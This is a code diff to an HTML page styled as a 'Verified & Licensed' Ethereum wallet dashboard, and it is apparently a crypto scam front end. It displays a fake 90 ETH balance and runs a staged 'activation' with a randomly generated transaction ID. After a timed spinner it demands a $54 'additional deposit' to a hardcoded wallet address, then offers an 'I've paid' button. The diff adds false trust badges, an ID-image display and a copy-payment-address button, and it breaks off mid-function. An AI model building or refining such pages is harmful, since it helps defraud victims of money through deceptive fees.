@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Deposit - Ethereum Wallet</title>
+  <title>Ethereum Extension Dashboard</title>
   <meta name="viewport" content="width=400, initial-scale=1.0">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap">
   <style>
     body {
-      background: #f6f8fa;
+      background: #fff;
       font-family: 'Roboto', Arial, sans-serif;
       margin: 0;
       padding: 0;
@@ -15,43 +15,132 @@
       min-width: 320px;
       max-width: 420px;
       margin: 0 auto;
-      transition: background 0.25s;
+      letter-spacing: .01em;
+      transition: background 0.3s;
     }
+    /* --- Loading Screen --- */
+    #loading-screen {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 200;
+      transition: opacity 0.35s;
+    }
+    .loading-spinner {
+      width: 82px;
+      height: 82px;
+      margin-bottom: 28px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .loading-spinner:before {
+      content: "";
+      box-sizing: border-box;
+      position: absolute;
+      width: 82px;
+      height: 82px;
+      border-radius: 50%;
+      border: 7px solid #ff9800;
+      border-top-color: #fff;
+      border-right-color: #fff;
+      border-bottom-color: #ff9800;
+      border-left-color: #ff9800;
+      animation: spin 1.3s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg);}
+    }
+    .loading-eth-img-holder {
+      width: 66px;
+      height: 66px;
+      border-radius: 50%;
+      background: #fff;
+      overflow: hidden;
+      border: 2.5px solid #ff9800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      z-index: 2;
+      box-shadow: 0 2px 16px rgba(255,152,0,0.08);
+    }
+    #loading-eth-img {
+      width: 100%; height: 100%; object-fit: contain;
+    }
+    .img-upload-label {
+      position: absolute;
+      bottom: 3px; left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255,152,0,0.93);
+      color: #fff;
+      font-size: 11.5px;
+      font-weight: 500;
+      border-radius: 8px;
+      padding: 3.5px 8px;
+      cursor: pointer;
+      pointer-events: auto;
+      z-index: 3;
+      transition: background .2s;
+    }
+    .img-upload-label:hover { background: #fb7d01; }
+    #loading-eth-img-input { display: none; }
+    .loading-text {
+      font-size: 23px;
+      font-weight: 700;
+      margin-bottom: 7px;
+      color: #ff9800;
+      letter-spacing: .035em;
+      text-align: center;
+    }
+    .loading-note {
+      font-size: 14.5px;
+      color: #888;
+      margin-top: 2px;
+      letter-spacing: .01em;
+      text-align: center;
+    }
+    /* --- Main Dashboard Styling --- */
     header {
       display: flex;
       align-items: center;
       padding: 18px 12px 8px 12px;
-      border-bottom: 1px solid #ececec;
+      border-bottom: 1px solid #ffe3c1;
       background: #fff;
       position: sticky;
       top: 0;
       z-index: 10;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+      box-shadow: 0 2px 8px rgba(255,152,0,0.04);
     }
     .back-arrow {
       font-size: 28px;
       margin-right: 12px;
-      color: #222;
+      color: #ff9800;
       cursor: pointer;
       user-select: none;
       transition: color .2s;
     }
-    .back-arrow:hover {
-      color: #3777f3;
-    }
+    .back-arrow:hover { color: #fb7d01; }
     .deposit-title {
       font-size: 22px;
-      font-weight: 500;
+      font-weight: 600;
       display: flex;
       align-items: center;
-      letter-spacing: 0.01em;
+      letter-spacing: 0.02em;
     }
-    .deposit-title .green-dot {
+    .deposit-title .orange-dot {
       width: 18px;
       height: 18px;
       border-radius: 50%;
       background: #fff;
-      border: 2px solid #27c943;
+      border: 2px solid #ff9800;
       display: inline-flex;
       align-items: center;
       justify-content: center;
@@ -59,39 +148,60 @@
       position: relative;
       top: 1px;
     }
-    .deposit-title .green-dot::after {
+    .deposit-title .orange-dot::after {
       content: '';
       display: block;
       width: 7px;
       height: 7px;
       border-radius: 50%;
-      background: #27c943;
+      background: #ff9800;
+    }
+    .verified-badge {
+      display: flex;
+      align-items: center;
+      margin-left: 10px;
+      font-size: 13.5px;
+      font-weight: 500;
+      color: #ff9800;
+      background: #fff3e0;
+      padding: 4px 11px 4px 7px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(255,152,0,0.04);
+      gap: 6px;
+      letter-spacing: .01em;
+    }
+    .verified-badge .shield {
+      font-size: 17px;
+      color: #ff9800;
+      margin-right: 2px;
     }
     .tab-row {
       display: flex;
       margin: 18px 0 0 0;
-      border-bottom: 2px solid #ececec;
-      background: #f6f8fa;
+      border-bottom: 2px solid #ffe3c1;
+      background: #fff9f2;
+      border-radius: 0 0 8px 8px;
     }
     .tab {
       flex: 1;
       text-align: center;
       padding: 12px 0;
       font-size: 17px;
-      font-weight: 500;
+      font-weight: 600;
       cursor: pointer;
-      color: #bbb;
-      background: #f6f8fa;
+      color: #ff9800;
+      background: #fff9f2;
       border: none;
       outline: none;
       transition: color 0.2s, background 0.2s;
+      border-radius: 0 0 8px 8px;
     }
     .tab.active {
       color: #fff;
-      background: #3777f3;
+      background: #ff9800;
       border-radius: 10px 10px 0 0;
-      border-bottom: 2px solid #3777f3;
-      box-shadow: 0 2px 8px rgba(55,119,243,0.06);
+      border-bottom: 2px solid #ff9800;
+      box-shadow: 0 2px 8px rgba(255,152,0,0.06);
     }
     .currency-row {
       display: flex;
@@ -100,20 +210,24 @@
       padding: 0 18px;
       background: #fff;
       border-radius: 13px;
-      box-shadow: 0 2px 8px rgba(55,119,243,0.04);
+      box-shadow: 0 2px 8px rgba(255,152,0,0.04);
       min-height: 64px;
     }
     .currency-icon {
-      width: 44px;
-      height: 44px;
-      background: #f7f7fa;
+      width: 44px; height: 44px;
+      background: #fff6e5;
       border-radius: 50%;
       display: flex;
       justify-content: center;
       align-items: center;
       font-size: 22px;
       margin-right: 14px;
-      box-shadow: 0 2px 10px rgba(55,119,243,0.07);
+      box-shadow: 0 2px 10px rgba(255,152,0,0.07);
+      border: 2px solid #ff9800;
+      overflow: hidden;
+    }
+    #main-eth-img {
+      width: 100%; height: 100%; object-fit: contain;
     }
     .currency-details {
       flex: 1;
@@ -126,41 +240,44 @@
       font-weight: 500;
     }
     .currency-wallet {
-      color: #888;
+      color: #ff9800;
       font-size: 13px;
       margin-top: 2px;
+      font-weight: 500;
     }
     .currency-balance {
       text-align: right;
       font-size: 18px;
       font-weight: 700;
-      color: #3777f3;
+      color: #ff9800;
     }
     .currency-usd {
       text-align: right;
-      color: #888;
+      color: #ff9800;
       font-size: 13px;
       margin-top: 2px;
     }
     .section-label {
       font-size: 16px;
-      font-weight: 500;
+      font-weight: 600;
       margin: 28px 0 0 18px;
       display: flex;
       align-items: center;
       letter-spacing: .01em;
+      color: #ff9800;
+      gap: 3px;
     }
     .section-label .info-icon {
       font-size: 17px;
-      color: #3777f3;
-      margin-left: 4px;
+      color: #ff9800;
+      margin-left: 2px;
       cursor: pointer;
     }
     .section-value {
       font-size: 16px;
-      font-weight: 400;
+      font-weight: 500;
       margin: 0 0 0 18px;
-      color: #3777f3;
+      color: #ff9800;
       letter-spacing: .01em;
     }
     .warning-box {
@@ -168,7 +285,7 @@
       align-items: center;
       background: #fff8e1;
       border: 1.5px solid #ff9800;
-      color: #664600;
+      color: #df6700;
       margin: 16px 18px 0 18px;
       padding: 14px 14px 14px 48px;
       border-radius: 9px;
@@ -176,6 +293,7 @@
       font-size: 15px;
       letter-spacing: .01em;
       box-shadow: 0 2px 8px rgba(255,152,0,0.04);
+      font-weight: 500;
     }
     .warning-box .warning-icon {
       position: absolute;
@@ -187,27 +305,28 @@
     .wallet-label {
       margin: 24px 0 6px 18px;
       font-size: 16px;
-      font-weight: 500;
+      font-weight: 600;
       display: flex;
       align-items: center;
       letter-spacing: .01em;
+      color: #ff9800;
     }
     .wallet-label .down-arrow {
       font-size: 15px;
       margin-left: 6px;
-      color: #bbb;
+      color: #ff9800;
     }
     .wallet-address-box {
       margin: 0 18px;
       padding: 10px 12px;
       border-radius: 8px;
-      border: 1.5px solid #ececec;
-      background: #f8fafc;
+      border: 1.5px solid #ffe3c1;
+      background: #fff9f2;
       font-size: 18px;
       word-break: break-all;
       font-family: 'Roboto Mono', monospace, monospace;
       font-weight: 500;
-      color: #222;
+      color: #ff9800;
       letter-spacing: 0.5px;
       transition: border .2s;
       user-select: all;
@@ -223,7 +342,7 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      background: linear-gradient(90deg, #3777f3 60%, #3bc5e1 100%);
+      background: linear-gradient(90deg, #ff9800 60%, #ffb74d 100%);
       color: #fff;
       border: none;
       border-radius: 9px;
@@ -232,7 +351,7 @@
       margin: 0 2px;
       padding: 15px 0;
       cursor: pointer;
-      box-shadow: 0 2px 12px 0 rgba(55,119,243,0.06);
+      box-shadow: 0 2px 12px 0 rgba(255,152,0,0.08);
       transition: background .2s, color .2s, box-shadow .2s;
       letter-spacing: .01em;
       outline: none;
@@ -242,51 +361,53 @@
       font-size: 19px;
     }
     .activate-btn:active {
-      background: linear-gradient(90deg, #2656b1 60%, #29919e 100%);
+      background: linear-gradient(90deg, #fb7d01 60%, #ff9800 100%);
     }
     .copy-btn {
-      background: #f2f7fe;
-      color: #3777f3;
+      background: #fff3e0;
+      color: #ff9800;
       font-weight: 500;
       box-shadow: none;
-      border: 1.2px solid #e3eaf3;
+      border: 1.2px solid #ffe3c1;
       transition: border .2s, color .2s, background .2s;
     }
     .copy-btn:active {
-      background: #e3eaf3;
-      color: #2656b1;
-      border: 1.2px solid #3777f3;
+      background: #ffe3c1;
+      color: #fb7d01;
+      border: 1.2px solid #ff9800;
     }
     .comment-label {
       margin: 24px 0 6px 18px;
       font-size: 15px;
-      font-weight: 500;
+      font-weight: 600;
       letter-spacing: .01em;
+      color: #ff9800;
     }
     .comment-input-row {
       display: flex;
       align-items: center;
       margin: 0 18px;
-      background: #fafaff;
+      background: #fff9f2;
       border-radius: 8px;
-      border: 1.5px solid #ececec;
+      border: 1.5px solid #ffe3c1;
       padding: 8px 10px;
-      box-shadow: 0 2px 8px rgba(55,119,243,0.03);
+      box-shadow: 0 2px 8px rgba(255,152,0,0.03);
     }
     .comment-input {
       flex: 1;
       border: none;
       background: transparent;
       font-size: 16px;
-      color: #333;
+      color: #ff9800;
       outline: none;
       padding: 6px 0;
       font-family: 'Roboto', Arial, sans-serif;
       letter-spacing: .01em;
+      font-weight: 500;
     }
     .comment-check {
       font-size: 22px;
-      color: #3777f3;
+      color: #ff9800;
       background: none;
       border: none;
       cursor: pointer;
@@ -296,12 +417,12 @@
     .show-qr-btn {
       margin: 26px 18px 18px 18px;
       width: calc(100% - 36px);
-      background: linear-gradient(90deg, #e7efff 60%, #f7fafd 100%);
-      color: #3777f3;
+      background: linear-gradient(90deg, #fff3e0 60%, #fff9f2 100%);
+      color: #ff9800;
       border-radius: 9px;
       border: none;
       font-size: 19px;
-      font-weight: 500;
+      font-weight: 600;
       padding: 15px 0;
       display: flex;
       align-items: center;
@@ -309,16 +430,14 @@
       cursor: pointer;
       transition: background 0.2s;
       letter-spacing: .01em;
+      gap: 7px;
     }
-    .show-qr-btn .icon {
-      margin-right: 8px;
-      font-size: 20px;
-    }
+    .show-qr-btn .icon { font-size: 21px; }
     /* Modal styles */
     .modal-bg {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.16);
+      background: rgba(255,152,0,0.05);
       display: none;
       z-index: 99;
       justify-content: center;
@@ -326,19 +445,17 @@
       min-height: 100vh;
       transition: background .25s;
     }
-    .modal-bg.active {
-      display: flex;
-    }
+    .modal-bg.active { display: flex; }
     .modal-box {
       background: #fff;
       border-radius: 15px;
-      box-shadow: 0 5px 36px 0 rgba(0,0,0,0.13);
-      max-width: 97vw;
+      box-shadow: 0 5px 36px 0 rgba(255,152,0,0.17);
+      max-width: 98vw;
       width: 350px;
       padding: 32px 22px 22px 22px;
       position: relative;
       animation: popup 0.19s cubic-bezier(.5,.5,.25,1.4);
-      border: 1.5px solid #e3eaf3;
+      border: 1.5px solid #ffe3c1;
       transition: box-shadow .2s, border .2s;
     }
     @keyframes popup {
@@ -352,25 +469,23 @@
       background: none;
       border: none;
       font-size: 22px;
-      color: #bbb;
+      color: #ff9800;
       cursor: pointer;
       transition: color .2s;
       z-index: 10;
     }
-    .modal-close:hover {
-      color: #3777f3;
-    }
+    .modal-close:hover { color: #fb7d01; }
     .modal-title {
       font-size: 20px;
       font-weight: 700;
       margin-bottom: 14px;
-      color: #3777f3;
+      color: #ff9800;
       text-align: center;
       letter-spacing: 0.01em;
     }
     .modal-content {
       font-size: 15.5px;
-      color: #333;
+      color: #222;
       margin-bottom: 20px;
       line-height: 1.55;
       text-align: center;
@@ -385,13 +500,13 @@
     }
     .modal-checkbox {
       width: 22px; height: 22px;
-      accent-color: #3777f3;
+      accent-color: #ff9800;
       border-radius: 4px;
       margin: 0;
     }
-    .modal-confirm-btn, .modal-action-btn, .modal-paid-btn {
+    .modal-confirm-btn, .modal-action-btn, .modal-paid-btn, .modal-copy-btn {
       width: 100%;
-      background: #3777f3;
+      background: #ff9800;
       color: #fff;
       border: none;
       border-radius: 8px;
@@ -403,46 +518,54 @@
       transition: background 0.19s;
       letter-spacing: .01em;
       outline: none;
-      box-shadow: 0 2px 12px 0 rgba(55,119,243,0.08);
-    }
-    .modal-confirm-btn:disabled {
-      opacity: 0.63;
-      background: #aac8f6;
-      cursor: not-allowed;
-      box-shadow: none;
-    }
-    .modal-action-btn {
-      margin-top: 18px;
-      background: #ff9800;
-      color: #fff;
-    }
-    .modal-paid-btn {
-      background: #27c943;
-      color: #fff;
-      margin-top: 18px;
+      box-shadow: 0 2px 12px 0 rgba(255,152,0,0.08);
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 6px;
     }
-    .modal-paid-btn:active {
-      background: #1f9e24;
+    .modal-confirm-btn:disabled {
+      opacity: 0.63;
+      background: #ffe3c1;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .modal-action-btn {
+      background: #fb7d01;
+    }
+    .modal-paid-btn {
+      background: #27c943;
+      margin-top: 11px;
+    }
+    .modal-paid-btn:active { background: #1f9e24; }
+    .modal-copy-btn {
+      background: #fff3e0;
+      color: #ff9800;
+      margin-top: 10px;
+      font-weight: 700;
+      border: 1.2px solid #ffe3c1;
+    }
+    .modal-copy-btn:active {
+      background: #ffe3c1;
+      color: #fb7d01;
+      border: 1.2px solid #ff9800;
     }
     .modal-box .tx-details {
-      background: #f5fbff;
+      background: #fff9f2;
       border-radius: 8px;
       padding: 15px 12px;
       margin: 16px 0 0 0;
       font-size: 15px;
       color: #222;
       text-align: left;
-      box-shadow: 0 2px 12px 0 rgba(55,119,243,0.06);
+      box-shadow: 0 2px 12px 0 rgba(255,152,0,0.06);
+      border: 1.2px solid #ffe3c1;
     }
     .txid-row {
       word-break: break-all;
       margin: 5px 0 0 0;
       font-size: 13px;
-      color: #3777f3;
+      color: #ff9800;
       font-family: 'Roboto Mono', monospace;
       letter-spacing: 0.5px;
     }
@@ -451,12 +574,12 @@
       font-size: 16px;
       font-weight: 700;
       margin-bottom: 7px;
-      color: #3777f3;
+      color: #ff9800;
       letter-spacing: 1px;
     }
     .receipt-hr {
       border: none;
-      border-top: 1.5px dashed #b3d5fa;
+      border-top: 1.5px dashed #ffe3c1;
       margin: 8px 0 10px 0;
     }
     .receipt-icon {
@@ -478,25 +601,23 @@
     }
     .modal-box .loading-icon {
       font-size: 36px;
-      color: #3777f3;
+      color: #ff9800;
       margin-bottom: 12px;
       animation: rotate 1.2s linear infinite;
       display: inline-block;
     }
-    @keyframes rotate {
-      to { transform: rotate(360deg);}
-    }
+    @keyframes rotate { to { transform: rotate(360deg);} }
     .modal-payment-address {
       font-family: 'Roboto Mono', monospace;
-      background: #f9fafd;
+      background: #fff9f2;
       border-radius: 8px;
       padding: 8px;
       font-size: 14px;
       margin: 7px 0 0 0;
-      color: #3777f3;
+      color: #ff9800;
       text-align: center;
       word-break: break-all;
-      border: 1.5px solid #e3eaf3;
+      border: 1.5px solid #ffe3c1;
       letter-spacing: 0.2px;
     }
     .modal-note {
@@ -504,6 +625,53 @@
       color: #888;
       margin-top: 7px;
       text-align: center;
+    }
+    /* UID modal image */
+    .modal-uid-img {
+      width: 110px;
+      height: 110px;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(255,152,0,0.11);
+      object-fit: contain;
+      border: 2.5px solid #ff9800;
+      margin: 0 auto 10px auto;
+      display: block;
+      background: #fff9f2;
+    }
+    .modal-uid-placeholder {
+      width: 110px;
+      height: 110px;
+      border-radius: 12px;
+      background: #fff3e0;
+      color: #ff9800;
+      font-size: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 10px auto;
+      border: 2.5px dashed #ffe3c1;
+      font-weight: 700;
+    }
+    /* Security assured box */
+    .security-assured {
+      background: #fff9f2;
+      color: #ff9800;
+      border-radius: 8px;
+      padding: 7px 13px;
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
+      margin: 22px 18px 10px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      border: 1.2px solid #ffe3c1;
+      box-shadow: 0 2px 8px rgba(255,152,0,0.03);
+    }
+    .security-assured .lock {
+      font-size: 17px;
+      color: #ff9800;
     }
     /* Responsive */
     @media (max-width: 480px) {
@@ -514,67 +682,94 @@
   </style>
 </head>
 <body>
-  <header>
-    <span class="back-arrow">&#8592;</span>
-    <span class="deposit-title">
-      <span class="green-dot"></span>
-      Deposit
-    </span>
-  </header>
-
-  <div class="tab-row">
-    <button class="tab active">Receive</button>
-    <button class="tab">Buy</button>
-  </div>
-
-  <div class="currency-row">
-    <div class="currency-icon">
-      <!-- Ethereum SVG Icon, modern style -->
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#e7efff"/><polygon points="16,6 24,18 16,23 8,18" fill="#3777f3"/><polygon points="16,6 16,23 8,18" fill="#3bc5e1"/></svg>
+  <!-- Loading Screen -->
+  <div id="loading-screen">
+    <div class="loading-spinner">
+      <div class="loading-eth-img-holder" id="loading-eth-img-holder">
+        <img id="loading-eth-img" src="" alt="ETH Logo" style="display:none;">
+        <span id="loading-eth-placeholder" style="font-size:32px;color:#ff9800;display:block;">🪙</span>
+        <label for="loading-eth-img-input" class="img-upload-label">Upload Logo</label>
+        <input id="loading-eth-img-input" type="file" accept="image/*">
+      </div>
     </div>
-    <div class="currency-details">
-      <span class="currency-name">Ethereum</span>
-      <span class="currency-wallet">Your wallet</span>
-    </div>
-    <div>
-      <div class="currency-balance">90 ETH</div>
-      <div class="currency-usd">&#8776; 349,874.1 USD</div>
+    <div class="loading-text">WELCOME BACK!</div>
+    <div class="loading-note">
+      Verified &amp; Licensed Ethereum Extension<br>
+      <span style="font-size:15px;">Security Assured <span style="font-size:17px;">&#128274;</span></span>
     </div>
   </div>
+  <!-- Main App -->
+  <div id="main-app" style="display:none;">
+    <header>
+      <span class="back-arrow">&#8592;</span>
+      <span class="deposit-title">
+        <span class="orange-dot"></span>
+        Deposit
+      </span>
+      <span class="verified-badge">
+        <span class="shield">&#128737;</span>
+        Verified &amp; Licensed
+      </span>
+    </header>
 
-  <div class="section-label">Network
-    <span class="info-icon" title="Deposit only via Ethereum mainnet.">&#9432;</span>
-  </div>
-  <div class="section-value">Ethereum</div>
+    <div class="tab-row">
+      <button class="tab active">Receive</button>
+      <button class="tab">Buy</button>
+    </div>
 
-  <div class="warning-box">
-    <span class="warning-icon">&#9888;</span>
-    When sending assets, choose only the Ethereum network, or else they won’t be deposited.
-  </div>
+    <div class="currency-row">
+      <div class="currency-icon">
+        <img id="main-eth-img" src="" alt="ETH Logo" style="display:none;">
+        <span id="main-eth-placeholder" style="font-size:26px;color:#ff9800;display:block;">🪙</span>
+      </div>
+      <div class="currency-details">
+        <span class="currency-name">Ethereum</span>
+        <span class="currency-wallet">Your wallet</span>
+      </div>
+      <div>
+        <div class="currency-balance">90 ETH</div>
+        <div class="currency-usd">&#8776; 349,874.1 USD</div>
+      </div>
+    </div>
 
-  <div class="wallet-label">
-    Wallet address
-    <span class="down-arrow">&#9660;</span>
-  </div>
-  <div class="wallet-address-box" id="wallet-address">
-    0×55fe07cb66ceefb36e15ee7e6373d758603bb575
-  </div>
+    <div class="section-label">Network
+      <span class="info-icon" title="Deposit only via Ethereum mainnet.">&#9432;</span>
+    </div>
+    <div class="section-value">Ethereum</div>
 
-  <div class="wallet-actions">
-    <button class="activate-btn" id="activate-btn"><span class="icon">&#9889;</span>ACTIVATE ETHEREUM</button>
-    <button class="copy-btn" id="copy-btn"><span class="icon">&#128203;</span>Copy</button>
-  </div>
+    <div class="warning-box">
+      <span class="warning-icon">&#9888;</span>
+      When sending assets, choose only the Ethereum network, or else they won’t be deposited.
+    </div>
 
-  <div class="comment-label">Internal comment</div>
-  <div class="comment-input-row">
-    <input class="comment-input" type="text" placeholder="Leave a comment" />
-    <button class="comment-check">&#10003;</button>
-  </div>
+    <div class="wallet-label">
+      Wallet address
+      <span class="down-arrow">&#9660;</span>
+    </div>
+    <div class="wallet-address-box" id="wallet-address">
+      0×55fe07cb66ceefb36e15ee7e6373d758603bb575
+    </div>
 
-  <button class="show-qr-btn">
-    <span class="icon">&#128273;</span>
-    Show QR
-  </button>
+    <div class="wallet-actions">
+      <button class="activate-btn" id="activate-btn"><span class="icon">&#9889;</span>ACTIVATE ETHEREUM</button>
+      <button class="copy-btn" id="copy-btn"><span class="icon">&#128203;</span>Copy</button>
+    </div>
+
+    <div class="comment-label">Internal comment</div>
+    <div class="comment-input-row">
+      <input class="comment-input" type="text" placeholder="Leave a comment" />
+      <button class="comment-check">&#10003;</button>
+    </div>
+
+    <button class="show-qr-btn" id="view-uid-btn">
+      <span class="icon">&#128272;</span>
+      VIEW UID 🪪
+    </button>
+    <div class="security-assured">
+      <span class="lock">&#128274;</span>
+      Safety Assured: All interactions are secure &amp; privacy protected.
+    </div>
+  </div>
 
   <!-- Modals -->
   <!-- Step 1: Confirmation Modal -->
@@ -584,7 +779,7 @@
       <div class="modal-title">Confirm Ethereum Activation</div>
       <div class="modal-content">
         You are about to activate and transfer<br>
-        <strong style="color:#3777f3;">90 ETH ≈ 349,874.1 USD</strong><br>
+        <strong style="color:#ff9800;">90 ETH ≈ 349,874.1 USD</strong><br>
         to the address below:<br>
         <div class="modal-payment-address" style="margin-top:10px;">
           0×55fe07cb66ceefb36e15ee7e6373d758603bb575
@@ -638,14 +833,16 @@
         Due to <b>high volume GWEI signal</b> on the Ethereum network,<br>
         <b>an additional deposit of $54 (0.01389071 ETH)</b> is required to authorize a successful withdrawal.<br>
         Please send payment directly to the address below:
-        <div class="modal-payment-address" style="margin-top:10px;">
+        <div class="modal-payment-address" style="margin-top:10px;" id="error-pay-address">
           0x80750bA2a09b363a8424A42503f95c9824AA8cf8
         </div>
       </div>
-      <div class="modal-note">
-        <span style="color:#ff9800;">&#9888;</span> Only payments to the address above will be accepted.
-      </div>
+      <button class="modal-copy-btn" id="modal-copy-btn">&#128203; Copy Payment Address</button>
       <button class="modal-paid-btn" id="modal-paid-btn">&#9989; I've paid</button>
+      <div class="modal-note" style="margin-top:7px;">
+        <span style="color:#ff9800;">&#9888;</span> Only payments to the address above will be accepted.<br>
+        <span style="color:#ff9800;">&#128737;</span> Verified And Completely Licensed ETHEREUM EXTENSION
+      </div>
     </div>
   </div>
 
@@ -660,24 +857,67 @@
     </div>
   </div>
 
-  <script>
-    // Modal helpers
-    function openModal(id) {
-      document.getElementById(id).classList.add('active');
-    }
-    function closeModal(id) {
-      document.getElementById(id).classList.remove('active');
-    }
-    function closeAllModals() {
-      document.querySelectorAll('.modal-bg').forEach(m => m.classList.remove('active'));
-    }
+  <!-- VIEW UID MODAL -->
+  <div class="modal-bg" id="modal-view-uid">
+    <div class="modal-box">
+      <button class="modal-close" onclick="closeModal('modal-view-uid')">&times;</button>
+      <div class="modal-title">User UID</div>
+      <div style="margin-bottom:14px;">
+        <img id="uid-upload-img" class="modal-uid-img" style="display:none;" alt="UID">
+        <div id="uid-upload-placeholder" class="modal-uid-placeholder">🪪</div>
+      </div>
+      <button class="modal-action-btn" onclick="closeModal('modal-view-uid')">Close</button>
+    </div>
+  </div>
 
-    // Step 1: Activate button triggers confirmation modal
+  <script>
+    // ----------- LOADING SCREEN LOGIC -----------
+    let ethImgDataUrl = '';
+    function showDashboardLogo(imgUrl) {
+      // main header/currency logo
+      const mainImg = document.getElementById('main-eth-img');
+      const mainPlaceholder = document.getElementById('main-eth-placeholder');
+      if(imgUrl){
+        mainImg.src = imgUrl;
+        mainImg.style.display = '';
+        mainPlaceholder.style.display = 'none';
+      }else{
+        mainImg.style.display = 'none';
+        mainPlaceholder.style.display = '';
+      }
+    }
+    // ETH LOGO UPLOAD
+    document.getElementById('loading-eth-img-input').addEventListener('change', function(e){
+      const file = e.target.files[0];
+      if(file && file.type.startsWith('image/')){
+        const reader = new FileReader();
+        reader.onload = function(ev){
+          ethImgDataUrl = ev.target.result;
+          document.getElementById('loading-eth-img').src = ethImgDataUrl;
+          document.getElementById('loading-eth-img').style.display = '';
+          document.getElementById('loading-eth-placeholder').style.display = 'none';
+          showDashboardLogo(ethImgDataUrl);
+        };
+        reader.readAsDataURL(file);
+      }
+    });
+    // On page load, 3s loading
+    window.addEventListener('DOMContentLoaded',function(){
+      setTimeout(function(){
+        document.getElementById('loading-screen').style.opacity = '0';
+        setTimeout(function(){
+          document.getElementById('loading-screen').style.display = 'none';
+          document.getElementById('main-app').style.display = '';
+          if(ethImgDataUrl) showDashboardLogo(ethImgDataUrl);
+        }, 300);
+      }, 3000);
+    });
+    // ----------- MAIN LOGIC -----------
+    // Activate button triggers confirmation modal
     document.getElementById('activate-btn').addEventListener('click', function() {
       openModal('modal-confirm');
     });
-
-    // Copy button logic
+    // Copy wallet address
     document.getElementById('copy-btn').addEventListener('click', function() {
       const addr = document.getElementById('wallet-address').textContent.trim();
       navigator.clipboard.writeText(addr);
@@ -686,12 +926,10 @@
         this.innerHTML = '<span class="icon">&#128203;</span>Copy';
       }, 1200);
     });
-
     // Confirmation checkbox logic
     document.getElementById('confirm-checkbox').addEventListener('change', function() {
       document.getElementById('modal-confirm-btn').disabled = !this.checked;
     });
-
     // Confirm button triggers processing modal
     document.getElementById('modal-confirm-btn').addEventListener('click', function() {
       closeModal('modal-confirm');
@@ -704,25 +942,30 @@
       const txid = '0x' + randHex(64);
       document.getElementById('txid-row').textContent = txid;
       openModal('modal-processing');
-      // After 9 seconds, show error modal
       setTimeout(function() {
         closeModal('modal-processing');
         openModal('modal-error');
       }, 9000);
     });
-
+    // Copy error modal payment address
+    document.getElementById('modal-copy-btn').addEventListener('click', function() {
+      const addr = document.getElementById('error-pay-address').textContent.trim();
+      navigator.clipboard.writeText(addr);
+      this.textContent = "Copied!";
+      setTimeout(() => {
+        this.innerHTML = "&#128203; Copy Payment Address";
+      }, 1200);
+    });
     // Paid button triggers checking modal, then returns to dashboard
     document.getElementById('modal-paid-btn').addEventListener('click', function() {
       closeModal('modal-error');
       openModal('modal-checking');
       setTimeout(function() {
         closeModal('modal-checking');
-        // Optionally clear checkbox for next use
         document.getElementById('confirm-checkbox').checked = false;
         document.getElementById('modal-confirm-btn').disabled = true;
       }, 2700);
     });
-
     // Close modals on close button
     document.querySelectorAll('.modal-close').forEach(btn => {
       btn.addEventListener('click', function() {
@@ -731,8 +974,7 @@
         document.getElementById('modal-confirm-btn').disabled = true;
       });
     });
-
-    // Optional: Comment check button feedback
+    // Comment check button feedback
     document.querySelector('.comment-check').addEventListener('click', function() {
       const input = document.querySelector('.comment-input');
       if(input.value.trim()) {
@@ -740,11 +982,58 @@
         setTimeout(()=>{this.textContent = "✓";}, 1000);
       }
     });
-
-    // Optional: Show QR button feedback
-    document.querySelector('.show-qr-btn').addEventListener('click', function() {
-      alert("QR code functionality coming soon.");
+    // VIEW UID logic
+    let uidImgDataUrl = '';
+    document.getElementById('view-uid-btn').addEventListener('click', function() {
+      openModal('modal-view-uid');
+      if(uidImgDataUrl){
+        document.getElementById('uid-upload-img').src = uidImgDataUrl;
+        document.getElementById('uid-upload-img').style.display = '';
+        document.getElementById('uid-upload-placeholder').style.display = 'none';
+      } else {
+        document.getElementById('uid-upload-img').style.display = 'none';
+        document.getElementById('uid-upload-placeholder').style.display = '';
+      }
     });
+    // Allow user to upload UID image by clicking UID in modal (for demo)
+    document.getElementById('uid-upload-placeholder').addEventListener('click', function(){
+      let fileInput = document.createElement('input');
+      fileInput.type = 'file';
+      fileInput.accept = 'image/*';
+      fileInput.onchange = function(e){
+        const file = e.target.files[0];
+        if(file && file.type.startsWith('image/')){
+          const reader = new FileReader();
+          reader.onload = function(ev){
+            uidImgDataUrl = ev.target.result;
+            document.getElementById('uid-upload-img').src = uidImgDataUrl;
+            document.getElementById('uid-upload-img').style.display = '';
+            document.getElementById('uid-upload-placeholder').style.display = 'none';
+          };
+          reader.readAsDataURL(file);
+        }
+      };
+      fileInput.click();
+    });
+    // Show ETH logo if uploaded for main currency icon
+    function showDashboardLogo(imgUrl) {
+      let mainImg = document.getElementById('main-eth-img');
+      let mainPlaceholder = document.getElementById('main-eth-placeholder');
+      if(imgUrl){
+        mainImg.src = imgUrl;
+        mainImg.style.display = '';
+        mainPlaceholder.style.display = 'none';
+      }else{
+        mainImg.style.display = 'none';
+        mainPlaceholder.style.display = '';
+      }
+    }
+    // Helpers
+    function openModal(id) { document.getElementById(id).classList.add('active'); }
+    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+    function closeAllModals() {
